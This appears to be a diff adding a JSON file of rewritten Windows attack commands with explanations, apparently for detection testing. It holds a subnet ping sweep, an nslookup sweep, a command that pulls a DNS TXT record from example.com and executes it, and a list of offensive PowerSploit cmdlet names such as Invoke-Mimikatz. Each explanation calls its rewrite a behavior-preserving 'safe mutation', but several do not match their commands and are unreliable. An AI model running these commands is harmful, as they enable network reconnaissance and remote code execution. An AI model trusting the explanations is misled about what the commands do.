@@ -1,0 +1,22 @@
+```json
+[
+  {
+    "output": "\"cmd.exe\" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i",
+    "explanation": "The original command uses double percent signs (%%i) for batch scripts, but in a direct command-line context (not a script), single percent signs (%i) are valid. This is a safe mutation that preserves the same behavior."
+  },
+  {
+    "output": "\"powershell.exe\" & {foreach ($ip in 1..255) {cmd.exe /c ping -n 1 -w 100 192.168.1.$ip}}",
+    "explanation": "Replaces the `for /l` loop with a `foreach` loop in PowerShell, which is functionally equivalent but syntactically different. This is a safe mutation that preserves the same behavior."
+  },
+  {
+    "output": "\"powershell.exe\" & {function nslookup { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",
+    "explanation": "Replaces quotes with escaped double quotes and removes unnecessary escape characters while preserving the same logic and behavior. This is a safe mutation."
+  },
+  {
+    "output": "\"powershell.exe\" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255) {cmd.exe /c nslookup $firstOctet.$secondOctet.$thirdOctet.$ip}}",
+    "explanation": "Replaces the `foreach` loop with a simplified version and removes unnecessary variable assignments while preserving the same behavior. This is a safe mutation."
+  },
+  {
+    "output": "\"powershell.exe\" & {$malcmdlets = @(\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"); foreach ($cmdlets in $malcmdlets) { \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"; $cmdlets}}",
+    "explanation": "Replaces the string array with a PowerShell array and simplifies the loop structure while preserving the same behavior. This is a safe mutation."
+  }
